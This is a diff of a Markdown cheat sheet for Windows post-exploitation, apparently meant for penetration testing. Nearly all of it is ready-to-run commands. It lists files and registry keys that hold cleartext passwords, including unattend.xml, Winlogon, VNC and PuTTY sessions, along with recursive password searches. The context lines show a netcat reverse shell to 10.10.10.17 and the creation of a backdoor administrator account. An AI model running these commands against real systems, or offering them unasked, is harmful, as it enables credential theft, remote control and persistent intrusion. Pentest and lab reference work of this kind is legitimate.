@@ -63,6 +63,31 @@ Get-Childitem
 Get-Content
 ```
 
+__networking stuff__
+TCP / UDP sockets
+```
+netstat -ano
+route print
+```
+
+__Looking for cleartext passwords?__
+```
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\unattend.xml
+
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
 For more Powershell stuff, i recommend __Babutzc__ his gist. Loads of commands and extra stuff :)
 > https://gist.github.com/babutzc/f68f5414fc8595ca8f80abbe36d7b946
 
@@ -86,41 +111,11 @@ $Session    = New-PSSession -Credential $Credential
 Invoke-Command -Session $Session  -ScriptBlock { nc.exe -e cmd.exe 10.10.10.17 443 }
 ```
 
-#### Adding users
+### Adding users
 Quickly add a user to the system. If admin privs are also acquired, add the user to the admin group. 
 ```
 net user appel Welkom01 /add
 net localgroup administrators appel /add
-```
-
-#### Cleartext passwords
-Looking for cleartext passwords?
-```
-c:\sysprep.inf
-c:\sysprep\sysprep.xml
-c:\unattend.xml
-
-%WINDIR%\Panther\Unattend\Unattended.xml
-%WINDIR%\Panther\Unattended.xml
-
-reg query "HKCU\Software\ORL\WinVNC3\Password"
-
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
-reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-```
-
-#### Open ports
-TCP / UDP sockets
-```
-netstat -ano
-```
-
-### Routes
-```
-route print
 ```
 
 #### MSF Post modules Windows
